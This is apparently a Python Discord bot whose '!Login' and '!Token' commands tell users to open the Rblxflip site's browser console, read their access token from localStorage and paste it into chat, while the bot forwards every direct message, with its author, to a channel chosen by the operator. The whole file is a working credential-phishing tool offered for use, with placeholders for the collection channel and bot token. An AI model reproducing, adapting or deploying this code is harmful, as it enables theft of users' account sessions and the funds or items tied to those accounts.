# By CodePulse 



import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True # Enable member intents
intents.messages = True # Enable message intents

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_message(message):
    if message.content == "!Login":
        # Create embed with the login prompt
        embed = discord.Embed(title="Login Prompt", color=discord.Color.blue())
        embed.add_field(name="Instructions", value="Please provide your Rblxflip Access Token to proceed, When you have your AcessToken paste it into chat", inline=False)
        
        await message.channel.send(embed=embed)
    elif message.content == "!Token":
        # Create embed with token information
        embed = discord.Embed(title="Token Information", color=discord.Color.blue())
        embed.add_field(name="", value="An Access Token is a code that allows you to access your Rblxflip account without having to log in every time. It is unique to your account and should be kept private.", inline=False)
        embed.add_field(name="How do I get my Access Token?", value="Go to rblxflip.com >> go to console and in the console type localStorage.acessToken copy it and paste it into the chat", inline=False)
        
        await message.channel.send(embed=embed)
    elif isinstance(message.channel, discord.DMChannel):
        # Create embed with author and content fields
        embed = discord.Embed(title="New DM", color=discord.Color.blue())
        embed.add_field(name="Author", value=message.author, inline=False)
        embed.add_field(name="Content", value=message.content, inline=False)
        
        channel = bot.get_channel(123456789) # Replace with your channel ID
        await channel.send(embed=embed)

    await bot.process_commands(message)

bot.run('Replace_With_Your_Token') # Replace with your bots token
